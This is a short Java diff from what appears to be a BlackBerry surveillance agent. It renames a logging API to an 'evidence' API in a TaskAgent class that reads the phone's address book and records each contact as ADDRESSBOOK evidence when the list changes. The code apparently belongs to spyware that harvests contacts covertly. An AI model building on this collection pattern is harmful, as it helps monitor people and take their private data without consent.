@@ -23,9 +23,9 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.config.Keys;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.EvidenceType;
+import blackberry.evidence.Markup;
 import blackberry.fs.Path;
-import blackberry.log.LogType;
-import blackberry.log.Markup;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
@@ -144,7 +144,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
             debug.trace("actualRun: got contacts");
             //#endif
 
-            log.createLog(null, LogType.ADDRESSBOOK);
+            evidence.createEvidence(null, EvidenceType.ADDRESSBOOK);
 
             Contact contact;
             while (eContacts.hasMoreElements()) {
@@ -153,7 +153,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
                 try {
                     final byte[] packet = getContactPacket(contactList, contact);
-                    log.writeLog(packet);
+                    evidence.writeEvidence(packet);
                 } catch (final Exception ex) {
                     //#ifdef DEBUG
                     debug.error(ex);
@@ -161,7 +161,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
                 }
             }
 
-            log.close();
+            evidence.close();
 
         } catch (final PIMException e) {
             //#ifdef DEBUG
@@ -433,9 +433,9 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
             final byte[] payload = getContactPacket(contactList, contact);
 
-            log.createLog(null, LogType.ADDRESSBOOK);
-            log.writeLog(payload);
-            log.close();
+            evidence.createEvidence(null, EvidenceType.ADDRESSBOOK);
+            evidence.writeEvidence(payload);
+            evidence.close();
         } catch (final Exception ex) {
             //#ifdef DEBUG
             debug.error(ex);
